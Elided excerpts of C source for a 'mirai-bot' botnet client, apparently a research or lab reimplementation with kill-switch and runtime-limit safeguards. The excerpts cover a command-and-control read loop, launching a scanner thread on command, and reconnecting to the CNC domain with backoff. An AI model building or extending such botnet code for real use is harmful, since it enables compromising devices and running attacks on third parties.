...
static bool cnc_read_command(cnc_conn_t *cnc) {
  ...
  cnc->cmds_received++;
  log_info("CNC command received: type=0x%02X payload_len=%u", cmd_type,
           payload_len);
  ...
  case CNC_CMD_SCAN:
    if (!g_bot_state.scanner_running) {
      ...
      pthread_create(&g_bot_state.scanner_thread, NULL, scanner_modern_run,
                     NULL);
...
static bool check_runtime_limit(const mirai_config_t *config) {
  if (!config->safeguards.enabled ||
      config->safeguards.max_runtime_seconds == 0) {
  ...
  if (elapsed >= 0 &&
      (uint64_t)elapsed >= config->safeguards.max_runtime_seconds) {
...
static void print_usage(const char *prog_name) {
  ...
  printf("\n");
  printf("Options:\n");
  printf("  -c, --config FILE      Configuration file (default: "
         "/etc/mirai/bot.json)\n");
...
static void main_loop(const mirai_config_t *config) {
  ...
  const char *ks_url =
      (config->safeguards.enabled && config->safeguards.kill_switch_url)
          ? config->safeguards.kill_switch_url
          : NULL;
  time_t max_rt = config->safeguards.enabled
                      ? (time_t)config->safeguards.max_runtime_seconds
                      : 0;
  ...
  while (g_bot_state.running) {
    ...
    if (!g_bot_state.cnc.connected) {
      log_info("Connecting to CNC: %s:%u (retry wait=%us)",
               config->network.cnc_domain, config->network.cnc_port,
               reconnect_wait);

      if (cnc_connect(&g_bot_state.cnc, config->network.cnc_domain,
        ...
        reconnect_wait =
            (reconnect_wait * 2 < MAX_WAIT) ? reconnect_wait * 2 : MAX_WAIT;
        continue;
      }
    }
    ...
    if (iteration % 60 == 0) {
      ...
      log_metric("bot.cmds_received", (double)g_bot_state.cnc.cmds_received,
                 "count");
...
int main(int argc, char **argv) {
  ...
  static struct option long_options[] = {
      {"config", required_argument, 0, 'c'}, {"verbose", no_argument, 0, 'v'},
  ...
  log_context_t context = {
      .component = "mirai-bot", .trace_id = NULL, .request_id = 0};
  ...
  log_info("CNC Domain: %s:%d", g_bot_state.config.network.cnc_domain,
